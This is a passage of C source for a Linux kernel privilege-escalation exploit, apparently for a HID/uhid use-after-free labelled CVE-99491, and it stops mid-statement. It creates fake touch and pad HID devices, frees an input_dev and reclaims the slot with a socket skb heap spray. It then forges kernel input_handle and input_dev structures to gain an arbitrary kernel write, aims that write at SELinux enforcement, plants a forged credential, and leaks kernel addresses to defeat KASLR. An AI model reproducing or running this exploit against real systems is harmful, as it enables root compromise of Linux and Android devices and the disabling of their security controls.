    while ((e = readdir(d)) != NULL) {
        char base[320], uevent[360], line[256];
        char name[96] = "", phys[64] = "", hidid[64] = "";
        FILE *f;

        if (e->d_name[0] == '.')
            continue;
        snprintf(base, sizeof(base), "/sys/bus/hid/devices/%s", e->d_name);
        snprintf(uevent, sizeof(uevent), "%s/uevent", base);
        f = fopen(uevent, "r");
        if (!f)
            continue;
        while (fgets(line, sizeof(line), f)) {
            char *nl = strpbrk(line, "\r\n");

            if (nl)
                *nl = 0;
            if (!strncmp(line, "HID_NAME=", 9))
                snprintf(name, sizeof(name), "%s", line + 9);
            else if (!strncmp(line, "HID_PHYS=", 9))
                snprintf(phys, sizeof(phys), "%s", line + 9);
            else if (!strncmp(line, "HID_ID=", 7))
                snprintf(hidid, sizeof(hidid), "%s", line + 7);
        }
        fclose(f);
        if (strcmp(phys, PHYS_COMMON))
            continue;
        {
            char drv[320], target[320] = "";
            ssize_t l;

            snprintf(drv, sizeof(drv), "%s/driver", base);
            l = readlink(drv, target, sizeof(target) - 1);
            if (l > 0)
                target[l] = 0;
            printf("[dbg] %s hid %s name=\"%s\" id=\"%s\" driver=%s\n", tag,
                   e->d_name, name, hidid,
                   l > 0 ? path_last_component(target) : "(none)");
        }
    }
    closedir(d);
}

static void dbg_dump_pair_evdev(const char *tag) {
    char cur[MAXEV][16];
    int n = list_events(cur);

    for (int i = 0; i < n; i++) {
        char path[32], phys[64] = "", name[96] = "";
        unsigned long sw[2] = { 0, 0 };
        int fd;

        snprintf(path, sizeof(path), "/dev/input/%s", cur[i]);
        fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (fd < 0)
            continue;
        ioctl(fd, EVIOCGPHYS(sizeof(phys) - 1), phys);
        ioctl(fd, EVIOCGNAME(sizeof(name) - 1), name);
        if (strcmp(phys, PHYS_COMMON) != 0) {
            close(fd);
            continue;
        }
        (void)ioctl(fd, EVIOCGBIT(EV_SW, sizeof(sw)), sw);
        printf("[dbg] %s evdev %s name=\"%s\" sw=%#lx mute_bit=%d\n", tag,
               cur[i], name, sw[0],
               !!(sw[0] & (1UL << SW_MUTE_DEVICE)));
        close(fd);
    }
}

static void dbg_trigger_state(const char *tag) {
    if (!getenv("CVE99491_CHAIN_DEBUG"))
        return;
    dbg_dump_hid_bindings(tag);
    dbg_dump_pair_evdev(tag);
}


/*
 * Close-watch on the touch evdev inode.  The evdev node is deleted when the
 * UHID device is destroyed, but the inode stays alive through our fd and
 * the watch; when InputReader closes its own fd the VFS emits
 * IN_CLOSE_WRITE/NOWRITE to this watch.  That is a userspace-only
 * (non-tracefs) signal for "our close is now the last reference".
 */
struct evdev_close_watch {
    int fd;
    int wd;
};

static int evdev_watch_open(struct evdev_close_watch *w, const char *path) {
    w->fd = inotify_init1(IN_NONBLOCK | IN_CLOEXEC);
    w->wd = -1;
    if (w->fd < 0)
        return -1;
    w->wd = inotify_add_watch(w->fd, path,
                              IN_CLOSE_WRITE | IN_CLOSE_NOWRITE);
    if (w->wd < 0) {
        close(w->fd);
        w->fd = -1;
        return -1;
    }
    return 0;
}

static int evdev_watch_drain(struct evdev_close_watch *w) {
    char buf[4096];
    int closes = 0;

    for (;;) {
        ssize_t n = read(w->fd, buf, sizeof(buf));

        if (n <= 0)
            break;
        for (char *q = buf; q < buf + n;) {
            struct inotify_event *e = (struct inotify_event *)q;

            if (e->mask & (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE))
                closes++;
            q += sizeof(*e) + e->len;
        }
    }
    return closes;
}

static int evdev_watch_wait(struct evdev_close_watch *w, long timeout_ms,
                            long *elapsed) {
    long t0 = now_ms(), dl = t0 + timeout_ms;
    int closes = 0;

    while (now_ms() < dl && !closes) {
        struct pollfd p = { .fd = w->fd, .events = POLLIN };
        long left = dl - now_ms();
        int pr;

        if (left < 0)
            left = 0;
        pr = poll(&p, 1, (int)left);
        if (pr <= 0)
            break;
        closes = evdev_watch_drain(w);
    }
    if (closes) {
        /* InputReader may own more than one fd.  Wait for further closes
         * only as long as they keep arriving: a fixed grace after the
         * first one cost 500ms on every run while the field log showed a
         * single close event.  Budget: 50ms of silence, 300ms total. */
        long gdl = now_ms() + 300;

        while (now_ms() < gdl) {
            struct pollfd p = { .fd = w->fd, .events = POLLIN };
            long left = gdl - now_ms();
            int pr, more;

            if (left > 20)
                left = 20;
            pr = poll(&p, 1, (int)left);
            if (pr <= 0)
                break;
            more = evdev_watch_drain(w);
            if (!more)
                break;
            closes += more;
        }
    }
    if (elapsed)
        *elapsed = now_ms() - t0;
    return closes;
}

static void evdev_watch_close(struct evdev_close_watch *w) {
    if (w->fd >= 0) {
        if (w->wd >= 0)
            (void)inotify_rm_watch(w->fd, w->wd);
        close(w->fd);
        w->fd = -1;
        w->wd = -1;
    }
}

static int read_msc_serial(int evfd, unsigned *val, long timeout_ms) {
    long dl = now_ms() + timeout_ms;
    struct input_event ev;
    while (now_ms() < dl) {
        ssize_t n = read(evfd, &ev, sizeof(ev));
        if (n == (ssize_t)sizeof(ev)) {
            if (ev.type == EV_MSC && ev.code == MSC_SERIAL) {
                *val = (unsigned)ev.value;
                return 0;
            }
            continue;
        }
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
            usleep(5000);
        else
            usleep(5000);
    }
    return -1;
}

/* Drop queued evdev events, then send a report and read the leaked word. */
static int leak_read(int uhidfd, int evfd, const unsigned char *payload,
                     int inrange, unsigned *val) {
    struct input_event ev;
    while (read(evfd, &ev, sizeof(ev)) == (ssize_t)sizeof(ev))
        ;
    if (uhid_input2(uhidfd, payload, inrange) < 0)
        return -1;
    return read_msc_serial(evfd, val, 500);
}

/* --- fake-structure payloads ----------------------------------------- */

static void put64(unsigned char *p, unsigned long long v) { memcpy(p, &v, 8); }
static void put32(unsigned char *p, unsigned v) { memcpy(p, &v, 4); }
static void put16(unsigned char *p, unsigned v) { memcpy(p, &v, 2); }

/*
 * Fake objects in the anchor input_buf.  The reclaimed touch input_dev
 * (kmem-2k, evbit=EV_SW) is walked by the pad MUTE report:
 *
 *   input_pass_values(dev2k)
 *     -> dev2k->grab = H (fake input_handle, handle_events =
 *        input_handle_events_default -- an exact KCFI type match)
 *     -> H->handler = P (fake input_handler, event = input_inject_event)
 *     -> input_inject_event(H, type, code, value) uses H->dev = D
 *     -> D->evbit gates the type, D->grab == NULL, D->event == NULL
 *     -> input_handle_event(D) -> input_event_dispose(D)
 *     -> D->vals[D->num_vals++] = {type, code, value}
 *
 * D->vals is an arbitrary kernel pointer, so one pre-filled entry writes
 * 8 controlled bytes anywhere.  A trailing EV_SYN/SYN_REPORT entry that
 * the kernel appends to the 2k vals array only reaches D if EV_SYN is
 * set in D->evbit; otherwise it is dropped by input_inject_event's
 * is_event_supported(type, dev->evbit, EV_MAX) gate.
 */
/* The forged cred rides inside every subsequent chain payload, so a
 * single anchor can both host the chain objects and hold the cred. */
static unsigned char g_cred_blob[CVE99491_CRED_MAX];
static int g_cred_blob_on;

static void build_chain_payload_ex(unsigned char *buf, unsigned long long base,
                                   unsigned long long slide,
                                   unsigned long long target,
                                   unsigned long long vals_target,
                                   unsigned etype, unsigned ecode, int evalue,
                                   unsigned abs_code) {
    memset(buf, 0, 4096);
    unsigned long long d = base + UHID_DATA_OFF;
    unsigned long long pa = d + C_OFF_P;
    unsigned long long da = d + C_OFF_D;
    unsigned char *h = buf + C_OFF_H;
    put64(h + IH_DEV_OFF, da);               /* handle->dev = D */
    put64(h + IH_HANDLER_OFF, pa);           /* handle->handler = P */
    put64(h + IH_EVENTS_OFF, SYM_IHE_DEFAULT + slide); /* handle_events */
    put64(buf + C_OFF_P + IHANDLER_EVENT_OFF,
          SYM_INJECT_EVENT + slide);           /* handler->event */
    unsigned char *dv = buf + C_OFF_D;
    put64(dv + IDEV_EVBIT_OFF, 1ULL << etype); /* evbit: only this type */
    put64(dv + IDEV_ABSBIT_OFF, 1ULL << abs_code);
    /* D->absinfo[abs_code].value is the write target; shifting the array
     * base by abs_code entries lets the uinput trigger rotate axes. */
    put64(dv + IDEV_ABSINFO_OFF,
          target - (unsigned long long)abs_code * ABSINFO_SIZE);
    put64(dv + IDEV_EVENT_OFF, 0);           /* event */
    put64(dv + IDEV_GRAB_OFF, 0);            /* grab */
    put32(dv + IDEV_EVENT_LOCK_OFF, 0);      /* event_lock */
    put64(dv + IDEV_HLIST_OFF, da + IDEV_HLIST_OFF); /* h_list self */
    put64(dv + IDEV_HLIST_OFF + 8, da + IDEV_HLIST_OFF);
    put32(dv + IDEV_NUM_VALS_OFF, 0);        /* num_vals */
    put32(dv + IDEV_MAX_VALS_OFF, 0x1000);   /* max_vals: no flush */
    put64(dv + IDEV_VALS_OFF, vals_target);  /* vals -> write target */
    dv[IDEV_INHIBITED_OFF] = 0;              /* inhibited */
    unsigned char *e = buf + C_OFF_E;
    put16(e + 0, etype);                     /* input_value{type,code,value} */
    put16(e + 2, ecode);
    put32(e + 4, (unsigned)evalue);
    if (g_cred_blob_on)
        memcpy(buf + C_OFF_FAKE, g_cred_blob, CRED_SIZE);
}

static void build_chain_payload(unsigned char *buf, unsigned long long base,
                                unsigned long long slide,
                                unsigned long long target,
                                unsigned long long vals_target, unsigned etype,
                                unsigned ecode, int evalue) {
    build_chain_payload_ex(buf, base, slide, target, vals_target, etype,
                           ecode, evalue, 0);
}

/* kmem-2k reclaim payload: starts the chain from the pad report. */
static void build_chain_uaf(unsigned char *buf, size_t len,
                            unsigned long long base) {
    unsigned long long evbit = 0x20;          /* EV_SW */
    unsigned long long swbit = 1UL << 14;     /* SW_MUTE_DEVICE */
    unsigned long long grab = base + UHID_DATA_OFF + C_OFF_H;
    unsigned long long vals = base + UHID_DATA_OFF + C_OFF_E;
    unsigned num_vals = 1;                    /* entry 0 pre-filled */
    unsigned max_vals = 2;                    /* append+sync+pass */

    memset(buf, 0, len);
    memcpy(buf + IDEV_EVBIT_OFF, &evbit, 8);
    memcpy(buf + IDEV_SWBIT_OFF, &swbit, 8);
    memcpy(buf + IDEV_GRAB_OFF, &grab, 8);
    memcpy(buf + IDEV_NUM_VALS_OFF, &num_vals, 4);
    memcpy(buf + IDEV_MAX_VALS_OFF, &max_vals, 4);
    memcpy(buf + IDEV_VALS_OFF, &vals, 8);
}

/*
 * Port: 5.15-style direct-vals probe payload.  The reclaimed touch
 * input_dev is replaced by a fake dev with grab=0 (no handle/KCFI indirect
 * call), evbit=EV_SW and vals pointing at `vals_target`.  num_vals=0 and
 * max_vals is left huge so every appended input_value is a plain 8-byte
 * store at vals_target + 8*num_vals; no flush/input_pass_values runs, so
 * h_list/grab are never dereferenced.  The pad MUTE report produces exactly
 * one EV_SW value here: input_sync()'s EV_SYN value is dropped because the
 * fake evbit only carries EV_SW, so only `vals_target` receives the
 * {u16 EV_SW, u16 SW_MUTE_DEVICE, s32 value} word.  run_trigger_probe()
 * points vals_target at selinux_state-1 so the word's byte1 clears the
 * enforcing byte.
 */
static void build_chain_probe(unsigned char *buf, size_t len,
                              unsigned long long vals_target) {
    unsigned long long evbit = 0x20;          /* EV_SW */
    unsigned long long swbit = 1UL << 14;     /* SW_MUTE_DEVICE */
    unsigned num_vals = 0;
    unsigned max_vals = 0x1000;               /* never flush */

    memset(buf, 0, len);
    memcpy(buf + IDEV_EVBIT_OFF, &evbit, 8);
    memcpy(buf + IDEV_SWBIT_OFF, &swbit, 8);
    memcpy(buf + IDEV_NUM_VALS_OFF, &num_vals, 4);
    memcpy(buf + IDEV_MAX_VALS_OFF, &max_vals, 4);
    memcpy(buf + IDEV_VALS_OFF, &vals_target, 8);
}

/* --- UAF trigger devices (T/P pair, same as the PoC) ----------------- */

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static int spray_fd[CVE99491_SPRAY_PAIRS_MAX][2];

static int spray_setup(void) {
    /* 24 pairs x 2 MiB gives ~48 MiB of queued skbs, enough for the
     * free-CPU local phase plus the all-CPU chunks and fallback. */
    int rcv = 2097152;
    for (int p = 0; p < (int)g_prof.spray_pairs; p++) {
        spray_fd[p][0] = spray_fd[p][1] = -1;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_fd[p]) < 0) {
            perror("socketpair");
            return -1;
        }
        for (int e = 0; e < 2; e++) {
            setsockopt(spray_fd[p][e], SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
            setsockopt(spray_fd[p][e], SOL_SOCKET, SO_SNDBUF, &rcv, sizeof(rcv));
        }
    }
    return 0;
}

static int spray_fire(long n, const unsigned char *buf) {
    cpu_set_t saved, one;
    long per_cpu;
    int ncpu = 0;

    if (sched_getaffinity(0, sizeof(saved), &saved) < 0)
        return -1;
    for (int c = 0; c < 8; c++)
        if (CPU_ISSET(c, &saved))
            ncpu++;
    per_cpu = n / (ncpu ? ncpu : 1);
    for (int c = 0; c < 8; c++) {
        if (!CPU_ISSET(c, &saved))
            continue;
        CPU_ZERO(&one);
        CPU_SET(c, &one);
        sched_setaffinity(0, sizeof(one), &one);
        for (long i = 0; i < per_cpu; i++) {
            int p = (int)(i % (long)g_prof.spray_pairs);
            if (write(spray_fd[p][0], buf, g_prof.spray_len) !=
                (ssize_t)g_prof.spray_len) {
                perror("spray write");
                sched_setaffinity(0, sizeof(saved), &saved);
                return -1;
            }
        }
    }
    sched_setaffinity(0, sizeof(saved), &saved);
    return 0;
}

static int spray_spread(long n, long ms, const unsigned char *buf) {
    const long chunk = 384;
    long chunks = (n + chunk - 1) / chunk;
    long gap_us = chunks > 1 ? ms * 1000 / (chunks - 1) : 0;
    if (gap_us < 1000)
        gap_us = 1000;
    for (long c = 0; c < chunks; c++) {
        long k = (c == chunks - 1) ? n - chunk * (chunks - 1) : chunk;
        if (k > 0 && spray_fire(k, buf) < 0)
            return -1;
        if (c < chunks - 1)
            usleep(gap_us);
    }
    return 0;
}

/* Free every sprayed skb so the next attempt can reclaim the same slot. */
static void spray_drain(void) {
    static unsigned char tmp[65536];
    for (int p = 0; p < (int)g_prof.spray_pairs; p++) {
        if (spray_fd[p][1] < 0)
            continue;
        for (;;) {
            ssize_t n = recv(spray_fd[p][1], tmp, sizeof(tmp), MSG_DONTWAIT);
            if (n <= 0)
                break;
        }
    }
}

/* --- anchor setup/leak helpers --------------------------------------- */

struct anchor {
    int fd;
    int evfd;
    unsigned char rdesc[64];
    size_t rlen;
    char node[32];
};

/* Create an anchor device, wait for its evdev node, probe and drain. */
static int anchor_create(struct anchor *a, unsigned index) {
    char phys[64];

    snprintf(phys, sizeof(phys), "uhid-anchor/%u/%d", index, (int)getpid());
    for (int attempt = 0; attempt < 3; attempt++) {
        char old[MAXEV][16];
        int nold = list_events(old);

        a->rlen = gen_rdesc(index, a->rdesc);
        a->fd = uhid_open();
        if (a->fd < 0) {
            usleep(20000);
            continue;
        }
        if (uhid_create(a->fd, NAME_ANCHOR, phys, 0x2200 + index, a->rdesc,
                        a->rlen) < 0) {
            close(a->fd);
            a->fd = -1;
            usleep(20000);
            continue;
        }
        if (find_new_event(old, nold, a->node, sizeof(a->node), 3000,
                           phys) < 0) {
            fprintf(stderr,
                    "[-] no evdev node for anchor index %u (attempt %d)\n",
                    index, attempt + 1);
            uhid_destroy(a->fd);
            close(a->fd);
            a->fd = -1;
            usleep(20000);
            continue;
        }
        a->evfd = open(a->node, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (a->evfd < 0) {
            perror("open evdev");
            uhid_destroy(a->fd);
            close(a->fd);
            a->fd = -1;
            usleep(20000);
            continue;
        }
        if (!pump_until_start(a->fd, now_ms() + 2500)) {
            fprintf(stderr, "[-] probe did not start (index %u, attempt %d)\n",
                    index, attempt + 1);
            close(a->evfd);
            a->evfd = -1;
            uhid_destroy(a->fd);
            close(a->fd);
            a->fd = -1;
            usleep(20000);
            continue;
        }
        pump_drain(a->fd, now_ms() + 500);
        return 0;
    }
    return -1;
}

static void anchor_close(struct anchor *a) {
    if (a->evfd >= 0)
        close(a->evfd);
    if (a->fd >= 0) {
        uhid_destroy(a->fd);
        close(a->fd);
    }
    a->fd = a->evfd = -1;
}

/* Leak one 32-bit word at index `index` from a fresh anchor. */
static int leak_word(unsigned index, unsigned *val) {
    for (int attempt = 0; attempt < 4; attempt++) {
        struct anchor a = { .fd = -1, .evfd = -1 };
        int rc = -1;

        if (anchor_create(&a, index) < 0) {
            anchor_close(&a);
            usleep(20000);
            continue;
        }
        for (int r = 0; r < 3; r++) {
            rc = leak_read(a.fd, a.evfd, NULL, 1, val);
            if (rc == 0)
                break;
            usleep(5000);
        }
        anchor_close(&a);
        if (rc == 0)
            return 0;
        usleep(10000);
    }
    return -1;
}

static unsigned long long combine_base(unsigned lo, unsigned hi) {
    /* The waitq self-pointer value is exactly base + uhid_waitq_self (0x1170
     * on the 6.18 builds, 0x1178 on 5.15; the profile value wins).  The
     * 64-bit subtraction carries the borrow into the high word. */
    return (((unsigned long long)hi << 32) | lo) - UHID_WAITQ_SELF;
}


/* --- Tier-1 persistent chain: one teardown, then drain+respray ------- */

/*
 * The dangerous part of a fire is the semantic teardown of the T/P pair
 * (the pad still holds a dangling touch_input).  Tier 1 keeps the pair:
 * the first fire frees the touch input_dev once and reclaims the slot
 * with our skb; every later fire just drains our own skbs (the slot
 * returns to this CPU's freelist still carrying our payload, except the
 * SLUB freepointer at offset 1024 which no critical field uses), re-
 * sprays a few dozen skbs and re-triggers.  The pad is never destroyed.
 */
struct pchain {
    struct anchor *a;
    unsigned long long base, slide;
    unsigned long long touch_dev; /* captured touch input_dev (oracle) */
    int pad_fd;
    int started;
    int touch_known;
    int oracle_live; /* kmem probe left enabled for retrigger checks */
};

/* tracefs kmem oracle (implemented after the trace helpers). */
static int trace_wr(const char *path, const char *s);
static void trace_reset(void);
static int oracle_capture_begin(void);
static int oracle_capture_touch(unsigned long long *out);
static int oracle_capture_cands(unsigned long long out[3], int *n);
static int oracle_free_alloc(const unsigned long long *cand, int ncand,
                             int *idx, int *cpu_out, int *alloc_hit);
static int oracle_spray_begin(void);
static int oracle_spray_match(unsigned long long ptr, int cpu);
static void oracle_end(void);
static void oracle_shutdown(void);
static int reclaim_calib_write(long depth, const char *pattern);
static int reclaim_calib_load(long *depth, const char *pattern);
static int reclaim_sysfs_bound(unsigned long *bound);
/* Port: used by the late-load acceptance markers before its definition. */
static int selinux_enforce_now(void);

/* Every fire is a 99491 UAF dance; the modes set a bounded budget (64). */
static long g_fires;
static long g_fire_cap; /* 0 = uncapped */
static long g_spread_ms; /* >0: refires spray across all CPUs */
static int g_oracle_disable; /* no-tracefs mode: skip the kmem oracle */
static int g_no_pad_fallback; /* no-tracefs: park instead of a blind pad */

static int g_pin_cpu;

static int pin_cpu(int cpu) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    g_pin_cpu = cpu;
    return sched_setaffinity(0, sizeof(set), &set);
}

static int fire_take(void) {
    if (g_fire_cap && g_fires >= g_fire_cap) {
        PLOG("fire budget exhausted (%ld)\n", g_fires);
        return -1;
    }
    g_fires++;
    return 0;
}

/* Send n skbs on the current CPU (no affinity changes). */
static int spray_local(long n, const unsigned char *buf) {
    long sent = 0;
    while (sent < n) {
        int any = 0;
        for (int k = 0; k < (int)g_prof.spray_pairs && sent < n; k++) {
            if (spray_fd[k][0] < 0)
                continue;
            any = 1;
            if (send(spray_fd[k][0], buf, g_prof.spray_len, 0) < 0)
                return -1;
            sent++;
        }
        if (!any)
            break;
    }
    return sent == n ? 0 : -1;
}

static int pchain_first(struct pchain *pc, unsigned long long target,
                        unsigned etype, unsigned ecode, int evalue,
                        long spray_n, long spread_ms) {
    unsigned char *pl = malloc(4096);
    unsigned char *sp = malloc(g_prof.spray_len);
    char old[MAXEV][16], node[32] = "", node_name[64] = "";
    int fd_t = -1, evfd = -1, nold, held = 0;
    int ev_close = -1, oracle_armed = 0;
    int free_cpu = -1, sniff_hit = 0;
    long ev_el = 0;
    struct evdev_close_watch ecw = { .fd = -1, .wd = -1 };
    int rc = -1;

    if (fire_take() < 0)
        goto out;
    if (!pl || !sp)
        goto out;
    build_chain_payload(pl, pc->base, pc->slide, target,
                        (etype == EV_ABS) ? (pc->base + UHID_DATA_OFF + C_OFF_SCRATCH)
                                          : target,
                        etype, ecode, evalue);
    if (uhid_input2(pc->a->fd, pl, 1) < 0)
        goto out;
    usleep(20000);
    unsigned long long touch_dev = 0;
    unsigned long long cand[3] = { 0, 0, 0 };
    int ncand = 0;
    int oracle_ok = 0;

    nold = list_events(old);
    fd_t = uhid_open();
    if (fd_t < 0)
        goto out;
    if (!g_oracle_disable && oracle_capture_begin() == 0) {
        if (uhid_create(fd_t, NAME_TOUCH, PHYS_COMMON, 0x1101, rdesc_touch,
                        sizeof(rdesc_touch)) < 0) {
            oracle_end();
            goto out;
        }
        pump_until_start(fd_t, now_ms() + 1500);
        usleep(20000);
        if (oracle_capture_cands(cand, &ncand) == 0) {
            oracle_ok = 1;
            touch_dev = cand[1];
            PLOG("oracle cand=%#llx,%#llx,%#llx\n", cand[0], cand[1],
                 cand[2]);
        } else {
            PLOG("oracle capture failed; deterministic spray\n");
            printf("[!] oracle capture failed; deterministic reclaim\n");
        }
        oracle_end();
    } else {
        if (uhid_create(fd_t, NAME_TOUCH, PHYS_COMMON, 0x1101, rdesc_touch,
                        sizeof(rdesc_touch)) < 0)
            goto out;
        pump_until_start(fd_t, now_ms() + 1500);
    }
    {
        int found = 0;

        for (int attempt = 0; attempt < 5 && !found; attempt++) {
            if (find_touch_node(old, nold, node, sizeof(node), node_name,
                                sizeof(node_name)) == 0)
                found = 1;
            else
                usleep(100000);
        }
        if (found) {
            evfd = open(node, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
            if (evfd >= 0) {
                held = 1;
                PLOG("hold %s (%s)\n", node, node_name);
            } else {
                PLOG("hold open %s failed: %s\n", node, strerror(errno));
            }
        } else {
            PLOG("no touch evdev after retry\n");
        }
    }
    if (!held) {
        /* Without the evdev ref the teardown frees the input_dev on an
         * uncontrolled CPU; never run the blind trigger in that state. */
        printf("[-] touch evdev unavailable; not triggering\n");
        goto out;
    }
    if (evfd >= 0) {
        if (evdev_watch_open(&ecw, node) == 0)
            PLOG("close watch %s\n", node);
        else
            PLOG("close watch failed: %s\n", strerror(errno));
    }
    pc->pad_fd = uhid_open();
    if (pc->pad_fd < 0)
        goto out;
    if (uhid_create(pc->pad_fd, NAME_PAD, PHYS_COMMON, 0x1102, rdesc_pad,
                    sizeof(rdesc_pad)) < 0)
        goto out;
    pump_until_start(pc->pad_fd, now_ms() + 1500);
    /* CHAIN_DEBUG: was the pad claimed by wacom, did it get an input node
     * with SW_MUTE_DEVICE?  Printed before the UAF teardown. */
    dbg_trigger_state("pair-up");

    /* The touch input_dev is held alive by our evdev fd.  Destroying the
     * UHID device leaves the pad's shared->touch_input dangling but does
     * not kfree the input_dev; once InputReader has dropped its own fd,
     * our close() is the last reference and performs the kfree on this
     * CPU.  The following same-CPU burst then lands on that slot. */
    /* Port: --stage=trigger swaps the reclaimed dev for the 5.15-style
     * direct-vals probe payload instead of the fake-handle chain, unless
     * CVE99491_TRIGGER_MODE=chain asks for the chain variant. */
    if (g_trigger_probe && !g_trigger_chain)
        build_chain_probe(sp, g_prof.spray_len, g_trigger_vals);
    else
        build_chain_uaf(sp, g_prof.spray_len, pc->base);
    uhid_destroy(fd_t); /* the single semantic teardown for this anchor */
    close(fd_t);
    fd_t = -1;
    if (ecw.fd >= 0) {
        ev_close = evdev_watch_wait(&ecw, (long)g_prof.spray_hold_wait_ms,
                                    &ev_el);
        PLOG("close watch ev=%d elapsed=%ld\n", ev_close, ev_el);
        evdev_watch_close(&ecw);
        if (ev_close <= 0) {
            printf("[-] close watch timeout; not triggering\n");
            goto out;
        }
    } else {
        long wait_ms = held ? (long)g_prof.spray_hold_wait_ms
                            : (long)g_prof.spray_wait_ms;

        if (wait_ms > 0)
            usleep((useconds_t)wait_ms * 1000);
    }
    if (held && g_prof.spray_fill > 0)
        (void)spray_local((long)g_prof.spray_fill, sp);
    /* Arm the kmem oracle before the close, so the freed slot is not
     * exposed to background allocations during the trace setup. */
    if (oracle_ok) {
        if (oracle_spray_begin() == 0) {
            oracle_armed = 1;
        } else {
            PLOG("oracle arm failed; deterministic spray\n");
            oracle_ok = 0;
        }
    }
    if (evfd >= 0) {
        close(evfd); /* last evdev ref: kfree on this CPU */
        evfd = -1;
    }
    /* Port: --stage=oracle requires the oracle to be live and armed; a blind
     * deterministic burst would be a write-capable UAF without verification. */
    if (g_stage == STAGE_ORACLE && !(oracle_ok && oracle_armed)) {
        printf("[-] oracle unavailable; --stage=oracle refuses a blind "
               "trigger\n");
        oracle_end();
        goto out;
    }
    if (oracle_armed && ncand == 3) {
        int idx = -1;
        int ahit = 0;

        /* The slot is hottest immediately after the free: take a sniff
         * chunk before the trace scan can let a background allocation
         * steal it.  The scan reads one ring pass and reports both the
         * close-time kfree and whether the sniff already owns the slot. */
        (void)spray_fire((long)g_prof.spray_burst_step, sp);
        if (oracle_free_alloc(cand, ncand, &idx, &free_cpu, &ahit) == 0) {
            touch_dev = cand[idx];
            sniff_hit = ahit;
            PLOG("oracle touch free cand[%d]=%#llx cpu=%d sniff_hit=%d\n",
                 idx, touch_dev, free_cpu, sniff_hit);
        } else {
            free_cpu = -1;
            PLOG("oracle touch free not found; heuristic cand[1]=%#llx\n",
                 touch_dev);
        }
        if (trace_wr(TR_PATH "/tracing_on", "1") != 0) {
            oracle_end();
            goto out;
        }
    }
    {
        long cap = spray_n > 0 ? spray_n : (long)g_prof.spray_count;
        long burst = cap;

        if (burst < (long)g_prof.spray_burst_min)
            burst = (long)g_prof.spray_burst_min;
        if (cap < burst)
            cap = burst;
        const char *pattern = "all-cpu";

        if (oracle_ok && oracle_armed) {
            int hit = sniff_hit;
            long total = sniff_hit ? (long)g_prof.spray_burst_step : 0;
            int scan_cpu = -1;

            /* The freed object's slab may be cold (not the freeing CPU's
             * active slab); the all-CPU chunks only give that CPU 1/8 of
             * the volume.  Hit the kfree CPU locally first, in scanned
             * chunks, so the spray walks its partial lists deeply. */
            if (!hit && free_cpu >= 0) {
                cpu_set_t saved, one;
                long local_total = 0;

                if (sched_getaffinity(0, sizeof(saved), &saved) == 0) {
                    CPU_ZERO(&one);
                    CPU_SET(free_cpu, &one);
                    if (sched_setaffinity(0, sizeof(one), &one) == 0) {
                        long lcap = 4096;

                        while (!hit && local_total < lcap) {
                            long k = (long)g_prof.spray_burst_step;

                            if (k > lcap - local_total)
                                k = lcap - local_total;
                            if (spray_local(k, sp) < 0)
                                break;
                            local_total += k;
                            hit = oracle_spray_match(touch_dev, free_cpu);
                            if (!hit && local_total < lcap &&
                                trace_wr(TR_PATH "/tracing_on", "1") != 0)
                                break;
                        }
                        sched_setaffinity(0, sizeof(saved), &saved);
                    }
                }
                PLOG("oracle local cpu=%d skbs=%ld hit=%d\n", free_cpu,
                     local_total, hit);
                if (hit)
                    total = local_total;
            }
            while (!hit && total < cap) {
                long k = (long)g_prof.spray_burst_step;

                if (k > cap - total)
                    k = cap - total;
                if (spray_fire(k, sp) < 0) {
                    oracle_end();
                    goto out;
                }
                total += k;
                hit = oracle_spray_match(touch_dev, scan_cpu);
                if (!hit && total < cap &&
                    trace_wr(TR_PATH "/tracing_on", "1") != 0) {
                    oracle_end();
                    goto out;
                }
            }
            if (!hit && held && ev_close > 0) {
                /* The close event proves the evdev ref was dropped, but
                 * not that the freed touch slot carries our skb.  Run one
                 * deterministic burst and require the oracle to confirm
                 * an skb allocation at the captured touch pointer before
                 * triggering: a blind pad report would dereference an
                 * unowned object and can panic. */
                PLOG("oracle miss; verified fallback burst\n");
                printf("[!] oracle miss; close event seen, verified "
                       "fallback\n");
                if (oracle_spray_begin() != 0) {
                    oracle_end();
                    goto out;
                }
                if (spray_fire(burst, sp) < 0) {
                    oracle_end();
                    goto out;
                }
                total += burst;
                usleep(20000);
                hit = oracle_spray_match(touch_dev, -1);
                if (!hit) {
                    PLOG("oracle fallback unconfirmed; not triggering\n");
                    printf("[-] oracle fallback unconfirmed; not triggering\n");
                }
            }
            if (!hit) {
                oracle_end();
                PLOG("oracle miss touch=%#llx depth=%ld pattern=%s\n",
